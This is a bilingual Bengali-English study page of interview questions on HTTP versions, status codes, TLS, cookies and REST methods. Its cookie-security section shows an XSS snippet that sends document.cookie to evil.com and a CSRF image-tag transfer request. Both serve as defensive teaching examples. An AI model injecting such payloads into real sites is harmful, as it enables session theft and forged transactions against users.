---
sidebar_position: 2
title: ''
---
## 🌐 60. What are HTTP and HTTPS protocols?
**HTTP (HyperText Transfer Protocol)** হলো ইন্টারনেটে ক্লায়েন্ট (ব্রাউজার) এবং সার্ভারের মধ্যে তথ্য আদান-প্রদান করার মূল প্রোটোকল। এটি রিকোয়েস্ট-রেসপন্স মডেলে কাজ করে এবং পোর্ট 80 ব্যবহার করে।
**HTTPS (HTTP Secure)** হলো HTTP এরই নিরাপদ বা এনক্রিপ্ট করা ভার্সন। এটি ডেটার নিরাপত্তা দিতে TLS প্রোটোকল যুক্ত করে এবং পোর্ট 443 ব্যবহার করে।

### 🆚 What is the difference between HTTP/1.0, HTTP/1.1, HTTP/2, and HTTP/3?
| ভার্সন | বৈশিষ্ট্য এবং পার্থক্য |
|---|---|
| **HTTP/1.0** | প্রতিটি রিকোয়েস্টের জন্য নতুন TCP কানেকশন তৈরি করতে হতো এবং রেসপন্স পেলে তা বন্ধ হয়ে যেত। এটি অনেক স্লো ছিল। |
| **HTTP/1.1** | **Keep-Alive** অপশন নিয়ে আসে। একই TCP কানেকশন খোলা রেখে পর পর একাধিক রিকোয়েস্ট পাঠানো যায়। তবে "Head-of-Line Blocking" সমস্যা ছিল (আগের রিকোয়েস্ট ঝুলে থাকলে পরেরগুলো আটকে যেত)। |
| **HTTP/2** | **Multiplexing** নিয়ে আসে। অর্থাৎ, একটিমাত্র TCP কানেকশনের ভেতর দিয়ে একসাথে অনেকগুলো রিকোয়েস্ট এবং রেসপন্স প্যারালালি এবং বাইনারি ফরমেটে পাঠানো সম্ভব। পেজ লোড ফাস্ট হয়। |
| **HTTP/3** | TCP কে পুরোপুরি বাদ দিয়ে **UDP-ভিত্তিক QUIC প্রোটোকল** ব্যবহার শুরু করে। এটি কানেকশন ওভারহেড কমিয়ে কম লেটেন্সির (0-RTT) সুবিধা দেয়। |

### ⚡ What protocol does HTTP/3 use instead of TCP, and why?
HTTP/3 ট্রান্সপোর্ট লেয়ার প্রোটোকল হিসেবে TCP-এর পরিবর্তে **QUIC (Quick UDP Internet Connections)** প্রোটোকল ব্যবহার করে, যা মূলত UDP এর ওপর তৈরি।
- **কেন?** TCP তে কানেকশন তৈরি করতে 3-way Handshake এবং এনক্রিপশনের জন্য TLS Handshake মিলে অনেক সময় নষ্ট হতো। এছাড়া TCP-তে একটি প্যাকেটে এরর হলে পুরো কানেকশন আটকে যেত। QUIC ব্যবহার করে UDP-এর গতির সাথে ইন-বিল্ট এনক্রিপশন এবং মাল্টিপ্লেক্সিং যুক্ত করে এই ল্যাটেন্সি সমস্যাগুলো দূর করা হয়েছে।

---
## 🔄 61. What happens during an HTTP request-response cycle?
```text
URL type → DNS → TCP → TLS → Request → Server → Response → Render
```
#### 📌 Step by Step
##### 1️⃣ DNS Resolution
```text
google.com → কোথায়?
Browser cache → OS cache → Router → ISP DNS
                                        │
                                        ▼
                               142.250.190.46 ✅
```
##### 2️⃣ TCP + TLS
```text
TCP:  SYN → SYN-ACK → ACK        (connection)
TLS:  ClientHello → ServerHello  (encryption)
```
##### 3️⃣ HTTP Request পাঠাও
```text
GET /search?q=hello HTTP/1.1
Host: www.google.com
User-Agent: Chrome/120
Accept: text/html
Cookie: SID=abc123
```
##### 4️⃣ Server Process করে
```text
Load Balancer → Web Server → App Server → DB/Cache
                                              │
                                         Response তৈরি
```
##### 5️⃣ HTTP Response আসে
```text
HTTP/1.1 200 OK
Content-Type: text/html
Content-Encoding: gzip
<!DOCTYPE html>...
```
##### 6️⃣ Browser Render করে
```text
HTML parse → DOM
CSS parse  → CSSOM
DOM+CSSOM  → Render Tree → Paint 🎨
```
---
#### 📊 Status Codes — মনে রাখো
```text
2xx → ✅ Success        (200 OK, 201 Created)
3xx → 🔀 Redirect       (301 Permanent, 304 Cached)
4xx → ❌ Client Error   (401, 403, 404, 429)
5xx → 💥 Server Error   (500, 502, 503)
```
---
#### 🚀 HTTP Versions
```text
HTTP/1.1 → Keep-Alive, কিন্তু HOL blocking
HTTP/2   → Multiplexing, Header compression
HTTP/3   → QUIC (UDP), fastest 🚀
```
### 🏷️ What is the role of the Host header in HTTP/1.1?
#### ⚠️ সমস্যাটা কী ছিল?
HTTP/1.0 তে Host header ছিল না। তখন:
```text
Client → TCP connect করে IP: 192.168.1.1
Client → "GET /index.html দাও"
Server ভাবে: "কোন website এর জন্য? জানি না!"
```
**একটা IP তে তখন একটাই website হোস্ট করা যেত।**
---
#### 🎯 Host Header কী Solve করে?
আজকে একটা server এ হাজারো website থাকতে পারে — সবার **একই IP:**
```text
IP: 104.21.30.45 এ আছে:
  → google.com
  → facebook.com  
  → amazon.com
  → আরো হাজারটা!
```
Host header বলে দেয় **"এই IP তে কোন website চাই:"**
```text
GET /index.html HTTP/1.1
Host: google.com          ← এটাই key!
```
---
#### 🖥️ Virtual Hosting — Host Header এর আসল জাদু
```text
CLIENT                         SERVER (104.21.30.45)
  │                                │
  │  GET / HTTP/1.1                │
  │  Host: site-a.com ────────────▶│
  │                                │ Host দেখে route করে
  │                                ├──▶ site-a.com files
  │                                │
  │  GET / HTTP/1.1                │
  │  Host: site-b.com ────────────▶│
  │                                ├──▶ site-b.com files
  │                                │
  │  GET / HTTP/1.1                │
  │  Host: site-c.com ────────────▶│
  │                                └──▶ site-c.com files
```
Server **একই IP থেকে** তিনটা আলাদা website serve করলো! এটাকেই বলে **Virtual Hosting।**
---
#### ❗ Host Header Mandatory — কেন?
HTTP/1.1 এ Host header **mandatory** — না দিলে:
```text
GET / HTTP/1.1
(Host নেই!)
Server → 400 Bad Request ❌
```
RFC 2616 clearly বলে: **"HTTP/1.1 request must include a Host header"**
---
#### 📝 Real Request এ কেমন দেখায়
```text
GET /search?q=hello HTTP/1.1
Host: www.google.com          ← domain + optional port
User-Agent: Chrome/120
Accept: text/html
```
Port সহ:
```text
GET / HTTP/1.1
Host: localhost:3000          ← development এ এভাবে
```
---
#### 🔄 Host Header ছাড়া আর কে Use করে?
**Reverse Proxy / Load Balancer:**
```text
Client → "Host: api.example.com"
              │
         Nginx/HAProxy
              │
         Host দেখে route করে:
         api.example.com  → Backend Server A
         web.example.com  → Backend Server B
         cdn.example.com  → CDN Server
```
**CDN:**
```text
Host: example.com আসলে →
CDN জানে কোন origin server থেকে content আনতে হবে
```
---
#### ⏭️ HTTP/2 এ কী হলো?
HTTP/2 তে Host header replace হয়েছে **:authority** pseudo-header দিয়ে:
```text
HTTP/1.1:             HTTP/2:
Host: google.com  →   :authority: google.com
```
### 🤝 How does persistent connection (keep-alive) work in HTTP/1.1?
HTTP/1.1-এ ডিফল্টভাবেই কানেকশনগুলো **Persistent (দীর্ঘস্থায়ী)** হয়। 
- যখন ব্রাউজার প্রথমবার একটি HTML পেজ রিকোয়েস্ট করে, সার্ভার পেজটি রেসপন্স হিসেবে দিয়ে দেয় কিন্তু TCP কানেকশনটি বন্ধ করে দেয় না।
- ব্রাউজার সেই পেজ পড়ে যখন দেখে যে এখানে আরও ১০টি ছবি এবং সিএসএস (CSS) এর লিংক আছে, তখন ব্রাউজার নতুন করে হ্যান্ডশেক না করে ওই একই খোলা পাইপলাইন দিয়ে বাকি রিকোয়েস্টগুলো দ্রুত পাঠিয়ে দেয়। কাজ শেষ হলে নির্দিষ্ট টাইমআউট পর সার্ভার কানেকশনটি ড্রপ করে।

---
## 📊 62. What are HTTP status codes (200 OK, 404 Not Found, 500 Internal Server Error)?
সার্ভার রিকোয়েস্টের ফলাফল কী হলো, তা সংক্ষেপে বোঝাতে ৩-ডিজিটের স্ট্যাটাস কোড পাঠায়। এগুলো ৫টি ক্লাসে বিভক্ত:
- `1xx`: Informational (রিকোয়েস্ট গ্রহণ করা হয়েছে, প্রসেস চলছে)
- `2xx`: Success (সফলভাবে সম্পন্ন হয়েছে)
- `3xx`: Redirection (আপনার চাওয়া ডেটা অন্য ঠিকানায় মুভ হয়েছে)
- `4xx`: Client Error (ক্লায়েন্টের অর্থাৎ ইউজারের রিকোয়েস্ট ভুল ছিল)
- `5xx`: Server Error (সার্ভারের ভেতরে কোডে এরর হয়েছে)

### 🚫 What is the difference between 401 Unauthorized and 403 Forbidden?
- **401 Unauthorized:** ইউজার সিস্টেমে লগইন বা অথেনটিকেটেড নয়। অর্থাৎ সার্ভার বলে, "আমি জানি না তুমি কে, আগে লগইন করে টোকেন নিয়ে আসো।"
- **403 Forbidden:** ইউজার সিস্টেমে লগইন করা আছে এবং সার্ভার তাকে চেনে, কিন্তু ওই নির্দিষ্ট ফোল্ডার বা রিসোর্স এক্সেস করার পারমিশন ইউজারের নেই। সার্ভার বলে, "আমি জানি তুমি কে, কিন্তু তোমার এখানে ঢোকার অনুমতি নেই।"

### 🔀 What is the difference between 301 and 302 redirects?
- **301 Moved Permanently:** ইউজার যে পেজ চাচ্ছে তা চিরকালের জন্য নতুন ঠিকানায় মুভ করা হয়েছে। গুগল বা সার্চ ইঞ্জিনগুলো এই কোড দেখলে তাদের সার্চ রেজাল্টও আপডেট করে নেয়।
- **302 Found (Temporary Redirect):** ওই পেজটি সাময়িকভাবে অন্য ঠিকানায় পাঠানো হচ্ছে। যেমন, ওয়েবসাইট মেইনটেনেন্স চলার সময় একটি টেম্পরারি পেজে ইউজারকে পাঠানো। সার্চ ইঞ্জিন এখানে ইনডেক্স আপডেট করে না।

### ⏳ When would you use 429 Too Many Requests?
যখন কোনো ইউজার বা ক্লায়েন্ট এপিআই (API) সার্ভারের কাছে নির্দিষ্ট সময়ের মধ্যে মাত্রাতিরিক্ত রিকোয়েস্ট (Spamming বা DDoS) পাঠাতে থাকে, তখন রেট লিমিটিং (Rate Limiting) মেকানিজম ক্লায়েন্টকে ব্লক করে `429 Too Many Requests` স্ট্যাটাস কোড দেয়। এর সাথে `Retry-After` হেডার দিয়ে বলে দেওয়া যায় কতক্ষণ পর সে আবার রিকোয়েস্ট করতে পারবে।

### 💥 What is the difference between a 502 Bad Gateway and a 504 Gateway Timeout?
উভয় কোডই মূলত Nginx বা লোড ব্যালেন্সারের মতো প্রক্সি সার্ভার থেকে আসে, যখন পেছনের মূল সার্ভারে (যেমন Node.js বা PHP) সমস্যা থাকে।
- **502 Bad Gateway:** রিভার্স প্রক্সি পেছনের ব্যাকএন্ড সার্ভারের কাছে রিকোয়েস্ট পাঠিয়েছিল, কিন্তু ব্যাকএন্ড সার্ভার একটি ইনভ্যালিড (ভুল) রেসপন্স দিয়েছে বা ব্যাকএন্ড সার্ভার ক্র্যাশ করে বন্ধ আছে।
- **504 Gateway Timeout:** রিভার্স প্রক্সি ব্যাকএন্ডকে রিকোয়েস্ট পাঠিয়েছিল এবং ডাটা পাওয়ার অপেক্ষায় বসে ছিল, কিন্তু ব্যাকএন্ড সার্ভার এতটাই বিজি বা স্লো হয়ে গেছে যে নির্দিষ্ট সময়ের মধ্যে কোনো রেসপন্সই দিতে পারেনি।

### ⚠️ Why do browsers show "Your connection is not private" for SSL errors?
ব্রাউজারের এই মেসেজটি `401 Unauthorized` এরর এর কারণে আসে না — `401` হলো অ্যাপ্লিকেশন লেভেলের এপিআই রেসপন্স। "Your connection is not private" লেখাটি আসে যখন একটি ওয়েবসাইটের **TLS সার্টিফিকেট** অবৈধ, এক্সপায়ারড বা ট্রাস্টেড না হয় (সার্টিফিকেট এরর)। ব্রাউজার সিকিউরিটি রিস্ক মনে করে আপনাকে সতর্ক করে।

---
## 🛡️ 63. What is SSL/TLS, and how does it secure data during transmission?
> TLS হলো **internet এর security layer** — data পাঠানোর আগে encrypt করে, পৌঁছানোর পরে decrypt করে। কেউ মাঝপথে দেখলেও বুঝতে পারবে না।

#### 🛡️ TLS কী কী Problem Solve করে?
```text
Without TLS:
Attacker মাঝপথে বসে আছে (Man in the Middle)
You → "password=abc123" → [ATTACKER SEES!] → Server
                              😱
With TLS:
You → "x#9$kL@2mN!" → [ATTACKER SEES GIBBERISH] → Server
                              🔒
```
TLS তিনটা guarantee দেয়:
```text
1. 🔒 Confidentiality  → কেউ পড়তে পারবে না
2. ✅ Integrity        → কেউ বদলাতে পারবে না  
3. 🪪 Authentication   → সত্যিই google.com কিনা verify
```
---
#### 🔄 TLS কীভাবে কাজ করে — Step by Step
##### Step 1: Certificate — পরিচয় প্রমাণ
Server একটা **Digital Certificate** দেখায়:
```text
┌─────────────────────────────────────┐
│         TLS Certificate             │
├─────────────────────────────────────┤
│ Subject:  www.google.com            │
│ Issued by: DigiCert Inc             │
│ Valid:     Jan 2026 - Jan 2027      │
│ Public Key: [RSA 2048-bit key]      │
│ Signature: [DigiCert এর signature] │
└─────────────────────────────────────┘
```
Browser verify করে:
```text
DigiCert trusted CA? ✅
Signature valid?     ✅
Domain match?        ✅
Expired?             ❌ না
→ Certificate trusted! ✅
```
**CA (Certificate Authority)** হলো trusted third party — DigiCert, Let's Encrypt, Comodo ইত্যাদি।

---
##### Step 2: Key Exchange — Secret Share করো
দুজন মিলে একটা **shared secret** বানায় — কেউ জানতে পারে না।

##### Step 3: Encryption — Data Scramble করো
Shared secret থেকে **symmetric key** বানায়, তারপর data encrypt করে:
```text
Plaintext:  "password=hello123"
Key:        [shared secret থেকে derived]
Algorithm:  AES-256-GCM
Ciphertext: "7f3#kL9$mN2@pQ8..."
```
Receiver একই key দিয়ে decrypt করে:
```text
"7f3#kL9$mN2@pQ8..." → "password=hello123" ✅
```
---
##### Step 4: MAC — Integrity Check
Data বদলানো হয়েছে কিনা detect করতে **Message Authentication Code:**
```text
Data পাঠানোর সময়:
MAC = HMAC(data + secret key)
পাঠাও: [data] + [MAC]
Receiver এ:
MAC recompute করো
Match করলে → data intact ✅
Match না করলে → কেউ বদলেছে! ❌ DROP
```
---
#### ⚖️ Symmetric vs Asymmetric — দুটোই লাগে কেন?
```text
Asymmetric (Public/Private Key):
✅ Key securely exchange করা যায়
❌ অনেক slow (100x slower)
→ শুধু handshake এ use হয়

Symmetric (Shared Key):
✅ অনেক fast
❌ Key আগে থেকে share করতে হয়
→ actual data encrypt এ use হয়

TLS দুটো combine করে:
Asymmetric দিয়ে → Symmetric key exchange করো
Symmetric দিয়ে → Data encrypt করো 🚀
```
---
#### 🔄 Full TLS 1.3 Flow
```text
CLIENT                          SERVER
  │                               │
  │──── ClientHello ─────────────▶│
  │     + DH Key Share            │
  │                               │
  │◀─── ServerHello ──────────────│
  │◀─── Certificate ──────────────│ "এই আমার পরিচয়"
  │◀─── Finished (encrypted) ─────│
  │                               │
  │  Certificate verify করো      │
  │  Shared secret compute করো   │
  │                               │
  │──── Finished ────────────────▶│
  │──── Encrypted Data ──────────▶│ 🔒
  │◀─── Encrypted Response ───────│ 🔒
```
---
#### 🔐 HTTPS = HTTP + TLS
```text
HTTP  → Plain text, কেউ দেখতে পায়
HTTPS → TLS এর ভেতরে HTTP, encrypted
URL:  http://  → Port 80,  no encryption
      https:// → Port 443, TLS encrypted
```
Browser এ দেখো:
```text
🔒 https://google.com  → TLS active, safe
⚠️  http://google.com  → No encryption, careful!
```
---
#### 🛡️ Common Attacks TLS থেকে বাঁচায়
```text
Attack                  TLS এর Defense
────────────────────────────────────────────────
Man-in-the-Middle   →   Certificate verify করে
Eavesdropping       →   Encryption
Data Tampering      →   MAC/HMAC integrity check
Replay Attack       →   Session-unique nonces
Downgrade Attack    →   TLS 1.3 এ weak cipher নেই
```
```text
TLS = তিনটা জিনিস নিশ্চিত করে
🪪 Authentication  → "তুমি কি সত্যিই google.com?"
                      Certificate দিয়ে prove করো
🔒 Confidentiality → "কেউ পড়তে পারবে না"
                      AES encryption দিয়ে
✅ Integrity        → "কেউ বদলাতে পারবে না"
                      HMAC দিয়ে
```

### 🆚 What is the difference between SSL and TLS?
- **SSL:** ১৯৯০ এর দশকে তৈরি প্রথম দিকের সিকিউরিটি প্রোটোকল (SSL 2.0, SSL 3.0)। এগুলোতে অনেক সিকিউরিটি দুর্বলতা বের হওয়ার পর এগুলো পুরোপুরি বাতিল (Deprecated) ঘোষণা করা হয়েছে।
- **TLS:** এটি মূলত SSL এরই আপডেট করা, নতুন এবং অনেক বেশি সিকিউর ভার্সন (বর্তমানে TLS 1.2 এবং 1.3 ব্যবহৃত হয়)। সবাই এখনও মুখে "SSL Certificate" বললেও ভেতরে ভেতরে আসলে সবাই **TLS** প্রোটোকলই ব্যবহার করছে।

### 🔏 Explain the difference between Symmetric and Asymmetric encryption during a TLS handshake
- **Asymmetric Encryption:** এখানে চাবি দুটি থাকে—একটি Public Key (সবাই জানে), আরেকটি Private Key (শুধু সার্ভার জানে)। পাবলিক কী দিয়ে এনক্রিপ্ট করা ডেটা শুধু প্রাইভেট কী দিয়েই ডিক্রিপ্ট করা যায়। এই পদ্ধতিটি স্লো। তাই TLS হ্যান্ডশেকের শুরুতে শুধু সিক্রেট শেয়ারিং বা সেশন কী (Session Key) বিনিময়ের কাজ করতে এই পদ্ধতি ব্যবহৃত হয়।
- **Symmetric Encryption:** এখানে তালা এবং চাবি একটাই। অর্থাৎ যে চাবি দিয়ে এনক্রিপ্ট করা হয়, ওই একই চাবি দিয়ে ডিক্রিপ্ট করতে হয়। এটি অনেক ফাস্ট। হ্যান্ডশেকের শেষে উভয় পক্ষ ওই শেয়ার করা চাবি (Session Key) দিয়ে বাকি সব ডেটা এই সিমেট্রিক পদ্ধতিতে আদান প্রদান করতে থাকে।

---
## 📑 64. What are request methods, HTTPS handshake, and Certificate Authorities?
- **Request Methods:** এগুলো বুঝায় ক্লায়েন্ট সার্ভারের কাছে কী ধরণের একশন করতে চাচ্ছে (যেমন `GET`, `POST`, `DELETE`)।
- **Certificate Authority (CA):** ইন্টারনেটে যে কেউ চাইলে নিজে নিজে একটি ফেক সার্টিফিকেট বানিয়ে বলতে পারে "আমিই ব্যাংক এশিয়া"। CA (যেমন Let's Encrypt, DigiCert) হলো থার্ড-পার্টি বিশ্বস্ত প্রতিষ্ঠান, যারা ভেরিফাই করে আসল সার্টিফিকেট ইস্যু করে দেয়। আর ব্রাউজারের ভেতর এই CA কোম্পানিগুলোর লিস্ট আগে থেকেই ট্রাস্টেড হিসেবে বসানো থাকে।

---
## 🍪 65. What are cookies, and how are they used in HTTP/HTTPS communication?
> Cookie হলো **ছোট্ট data piece** যা Server browser এ রেখে যায় — পরের request এ browser সেটা ফেরত পাঠায়। এভাবে server "মনে রাখে" তুমি কে।

#### 🤔 কেন Cookie দরকার?
HTTP **stateless** — প্রতিটা request আলাদা, server কিছু মনে রাখে না:
```text
Request 1: "আমি login করলাম" → Server: ✅
Request 2: "আমার profile দাও" → Server: "তুমি কে??" 😕
HTTP নিজে মনে রাখতে পারে না!
```
Cookie এই সমস্যা solve করে:
```text
Login → Server cookie দিলো → Browser save করলো
পরের request → Browser cookie পাঠালো → Server চিনলো ✅
```
---
#### 🛠️ Cookie কীভাবে Set হয়?
##### Server → Browser (Set-Cookie header):
```text
HTTP/1.1 200 OK
Set-Cookie: session_id=abc123; Max-Age=3600; Secure; HttpOnly
Set-Cookie: theme=dark; Max-Age=86400
Set-Cookie: lang=bn; Path=/
```
##### Browser → Server (Cookie header):
```text
GET /dashboard HTTP/1.1
Host: example.com
Cookie: session_id=abc123; theme=dark; lang=bn
```
প্রতিটা request এ **automatically** পাঠায়!

---
#### 🧬 Cookie এর Anatomy
```text
Set-Cookie: session_id=abc123; Max-Age=3600; Domain=example.com; Path=/; Secure; HttpOnly; SameSite=Strict
├── Name=Value     → session_id=abc123    (actual data)
├── Max-Age        → 3600 seconds         (কতক্ষণ থাকবে)
├── Domain         → example.com          (কোন domain এ পাঠাবে)
├── Path           → /                    (কোন path এ পাঠাবে)
├── Secure         → HTTPS only           (HTTP তে পাঠাবে না)
├── HttpOnly       → JS access নেই        (XSS থেকে বাঁচায়)
└── SameSite       → Strict/Lax/None      (CSRF থেকে বাঁচায়)
```
---
#### 📋 Cookie এর Types
##### ১. Session Cookie
```text
Set-Cookie: session_id=abc123
(No Max-Age, No Expires)
→ Browser বন্ধ হলেই delete হয়
→ Temporary, RAM এ থাকে
→ Login session এর জন্য
```
##### ২. Persistent Cookie
```text
Set-Cookie: remember_me=xyz; Max-Age=2592000
                              ↑
                           30 days
→ Browser বন্ধ হলেও থাকে
→ Disk এ save হয়
→ "Remember me" feature এর জন্য
```
##### ৩. Secure Cookie
```text
Set-Cookie: token=abc; Secure
→ শুধু HTTPS connection এ পাঠাবে
→ HTTP তে পাঠাবে না
→ Man-in-the-middle থেকে বাঁচায়
```
##### ৪. HttpOnly Cookie
```text
Set-Cookie: session=abc; HttpOnly
→ JavaScript এ access নেই!
document.cookie → session দেখাবে না ✅
কেন দরকার?
XSS attack এ attacker JS inject করে cookie চুরি করে।
HttpOnly থাকলে JS দিয়ে access করাই যাবে না! ✅
```
##### ৫. SameSite Cookie
```text
SameSite=Strict → শুধু same site এর request এ পাঠাও
SameSite=Lax    → Same site + top-level navigation
SameSite=None   → সব জায়গায় (Secure লাগবে সাথে)
CSRF attack থেকে বাঁচায়!
```
---
#### 🎯 Cookie এর Use Cases
##### ১. Authentication / Session
```text
Login করলে:
Server → Set-Cookie: session_id=xyz123; HttpOnly; Secure
পরের request এ:
Browser → Cookie: session_id=xyz123
Server  → "xyz123 মানে user=rakib, logged in ✅"
```
##### ২. Personalization
```text
Theme বদললে:
Server → Set-Cookie: theme=dark; Max-Age=31536000
পরে আসলে:
Browser → Cookie: theme=dark
Server  → Dark mode দেখাও ✅
```
##### ৩. Shopping Cart
```text
Item add করলে:
Set-Cookie: cart=item1,item2,item3
Login না করলেও cart মনে থাকে ✅
```
##### ৪. Tracking / Analytics
```text
Google Analytics:
Set-Cookie: _ga=GA1.2.123456789; Max-Age=63072000
তোমার behavior track করে:
কোন page দেখলে, কতক্ষণ, কোথা থেকে এলে...
```
---
#### ⚠️ Cookie এর Security Risks
##### ১. XSS (Cross-Site Scripting)
```text
Attacker malicious JS inject করে:
<script>
  fetch('evil.com?cookie=' + document.cookie)
</script>
Cookie চুরি! 😱
Defense: HttpOnly flag ✅
```
##### ২. CSRF (Cross-Site Request Forgery)
```text
তুমি bank.com এ logged in।
Evil site এ গেলে:
<img src="bank.com/transfer?to=attacker&amount=10000">
Browser automatically cookie পাঠায়! 😱
Defense: SameSite=Strict ✅
```
##### ৩. Man-in-the-Middle
```text
HTTP connection এ cookie plaintext এ যায়:
"Cookie: session_id=abc123" ← attacker দেখে!
Defense: Secure flag + HTTPS ✅
```
---
#### 🏢 First-Party vs Third-Party Cookies
```text
তুমি আছো: example.com
First-Party Cookie:
Set by: example.com → example.com এই কাজে লাগে
→ Login, cart, preferences
→ Generally fine ✅
Third-Party Cookie:
Set by: ads.google.com → example.com visit এ
→ Cross-site tracking
→ Advertiser তোমাকে সব জায়গায় follow করে 😱
→ Chrome, Firefox এ block হচ্ছে ⚠️
```
---
#### 🗄️ Cookie vs LocalStorage vs SessionStorage
```text
Feature      Cookie           LocalStorage    SessionStorage
──────────────────────────────────────────────────────────
Size         4KB              5-10MB          5-10MB
Expiry       Manual set       Never           Tab close এ
Server এ     ✅ Auto send     ❌ না           ❌ না
JS Access    ✅ (HttpOnly ছাড়া) ✅            ✅
Secure Flag  ✅               ❌              ❌
Use Case     Auth, session    App data        Temp data
```
---
#### 🔄 Full Cookie Flow
```text
1. First Visit:
Browser ──GET /──────────────▶ Server
Browser ◀──200 OK─────────────
        ◀──Set-Cookie: id=123─
2. Cookie Saved:
Browser 💾 id=123
3. Next Request:
Browser ──GET /dashboard──────▶ Server
        ──Cookie: id=123──────▶
                                "id=123 = rakib ✅"
        ◀──200 OK (dashboard)──
4. Logout:
Server → Set-Cookie: id=; Max-Age=0  ← cookie delete!
```
---
#### 🧠 মনে রাখো
```text
Cookie = Server এর দেওয়া "পরিচয়পত্র" 🪪
Server দেয়     → Set-Cookie header
Browser রাখে   → disk/memory তে
Browser পাঠায় → প্রতিটা request এ automatically
Server চেনে   → "ও! তুমি rakib!"
Security:
HttpOnly  → XSS থেকে বাঁচো
Secure    → HTTP sniffing থেকে বাঁচো
SameSite  → CSRF থেকে বাঁচো 🔒
```

### 🔒 What is the difference between HttpOnly, Secure, and SameSite cookie attributes?
ডেভেলপাররা কুকি সেট করার সময় কিছু ফ্ল্যাগ ব্যবহার করেন সিকিউরিটি বাড়াতে:
- **HttpOnly:** এই কুকিটি ফ্রন্টএন্ডের জাভাস্ক্রিপ্ট (যেমন `document.cookie`) দিয়ে অ্যাক্সেস বা চুরি করা যাবে না। এটি শুধু সার্ভারেই যাবে। এটি XSS আক্রমণ থেকে সেশন টোকেন বাঁচায়।
- **Secure:** এই কুকিটি শুধুমাত্র HTTPS কানেকশনের ওপর দিয়েই পাস হবে। প্লেইন HTTP তে ব্রাউজার এটি পাঠাবে না।
- **SameSite:** এটি (যেমন `SameSite=Strict` বা `Lax`) বলে দেয় যে এই কুকিটি অন্য কোনো থার্ড-পার্টি ডোমেইন থেকে রিকোয়েস্ট এলে (Cross-site Request) পাঠানো হবে না। এটি মূলত CSRF (Cross-Site Request Forgery) অ্যাটাক প্রতিরোধ করে।

### ⏳ What is a session cookie vs a persistent cookie?
- **Session Cookie:** এই কুকিতে কোনো মেয়াদ বা Expiration date সেট করা থাকে না। ইউজার ব্রাউজার বা সাইট ক্লোজ করে দিলেই মেমোরি থেকে এই কুকি মুছে যায়।
- **Persistent Cookie:** এতে একটি নির্দিষ্ট Expiration date (যেমন ১ মাস) উল্লেখ থাকে। ব্রাউজার বন্ধ করলেও ১ মাসের জন্য ব্রাউজার হার্ডডিস্কে এটি সেভ করে রাখে ("Remember Me" ফিচারের জন্য কাজে লাগে)।

---
## 🚀 66. What is the role of HTTP/2 and HTTP/3 in improving web performance?
আধুনিক ওয়েব পেজ অনেক ভারী, তাতে প্রচুর সিএসএস, জেএস (JS) এবং ছবি থাকে।
- **HTTP/2** একটিমাত্র TCP কানেকশনের মাধ্যমে একসাথে অনেকগুলো রিকোয়েস্ট প্যারালালি পাঠায় (Multiplexing) এবং সার্ভার চাইলে ফাইল রিকোয়েস্ট করার আগেই পুশ করতে পারে (Server Push)।
- **HTTP/3** TCP-কে সরিয়ে QUIC (UDP-ভিত্তিক) নিয়ে আসে। এতে মোবাইলে নেটওয়ার্ক সুইচিং (ওয়াইফাই থেকে ডাটা) হলে কানেকশন বিচ্ছিন্ন হয় না এবং কানেকশন স্পিড উল্লেখযোগ্যভাবে বাড়ে।

### 🔀 What is HTTP/2 multiplexing and how does it solve head-of-line blocking?
- **সমস্যা (HTTP/1.1):** ব্রাউজার যদি একই কানেকশনে প্রথমে একটি ৫ মেগাবাইটের ছবি এবং তারপর একটি ছোট্ট CSS ফাইল রিকোয়েস্ট করে, তবে আগে ওই ছবি সম্পূর্ণ ডাউনলোড না হওয়া পর্যন্ত CSS ফাইলটি ডাউনলোডের অপেক্ষায় হোল্ড করে বসে থাকত। একে হেড-অফ-লাইন ব্লকিং (Head-of-Line Blocking) বলে।
- **সমাধান (Multiplexing):** HTTP/2 ডেটাকে বাইনারি ফ্রেমে বিভক্ত করে। ফলে একটি কানেকশনের ভেতর দিয়েই ছবি এবং CSS ফাইলটির টুকরোগুলো মিশ্রিত (Interleaved) অবস্থায় একই সাথে প্যারালালি ক্লায়েন্টে আসতে থাকে এবং কোনো ফাইল কাউকে ব্লক করে রাখে না।

### ⚡ What is QUIC and how does HTTP/3 use it?
**QUIC (Quick UDP Internet Connections)** প্রোটোকলটি ট্রান্সপোর্ট লেয়ার হিসেবে HTTP/3 তে কাজ করে।
- TCP তে প্যাকেট লস হলে পুরো মাল্টিপ্লেক্সড স্ট্রিমকে আটকে রেখে রিট্রান্সমিশনের জন্য হোল্ড করতে হতো। QUIC সেই জায়গায় UDP ব্যবহার করে। ফলে যদি একটি স্ট্রিমে ফ্রেম লস হয়, তবে শুধু সেই স্ট্রিমটি অপেক্ষায় থাকে, বাকি স্ট্রিমগুলোর ডেটা ট্রান্সফার চলতে থাকে (TCP-তে থাকা head-of-line blocking দূর করে)।
- পাশাপাশি, QUIC-এর ভেতরেই বিল্ট-ইনভাবে TLS 1.3 এনক্রিপশন থাকে, তাই সিকিউরিটির জন্য এক্সট্রা রাউন্ড-ট্রিপ সময় লাগে না।

---
## 🛠️ 67. How do backend developers implement RESTful APIs using HTTP methods? 
ব্যাকএন্ড ডেভেলপাররা সাধারণত HTTP এর বিল্ট-ইন মেথডগুলো ব্যবহার করে ডাটাবেসের CRUD (Create, Read, Update, Delete) অপারেশনগুলো ম্যাপ করেন, যাকে RESTful API বলা হয়।
- `POST` = Create (নতুন রিসোর্স তৈরি করা)
- `GET` = Read (ডেটা পড়া বা ফেচ করা)
- `PUT / PATCH` = Update (বিদ্যমান ডেটা পরিবর্তন করা)
- `DELETE` = Delete (ডেটা মুছে ফেলা)

### 🔄 What is the difference between PUT and PATCH?
- **PUT:** এটি পুরো রিসোর্সকে বা ডেটাকে রিপ্লেস (Replace) বা ওভাররাইট করে দেয়। যদি আপনি ইউজার অবজেক্ট আপডেট করেন এবং শুধু নাম পাঠান, তবে PUT ইউজারের বাকি ডাটা মুছে শুধু নাম আপডেট করবে।
- **PATCH:** এটি পার্শিয়াল বা আংশিক আপডেট (Partial Update) করে। ইউজারের শুধু নাম পাঠালে, এটি নাম পরিবর্তন করে কিন্তু ইউজারের ইমেইল বা অন্যান্য আগের ডেটা অক্ষত রাখবে।

### 🤔 What is idempotency and which HTTP methods are idempotent?
**Idempotency (আইডেমপোটেন্সি)** হলো এমন একটি বৈশিষ্ট্য যেখানে আপনি একই রিকোয়েস্ট একবার করুন বা কয়েক শতবার করুন, সার্ভারের ডাটার স্ট্যাটাস বা পরিণতি সর্বদা একই রকম থাকবে।
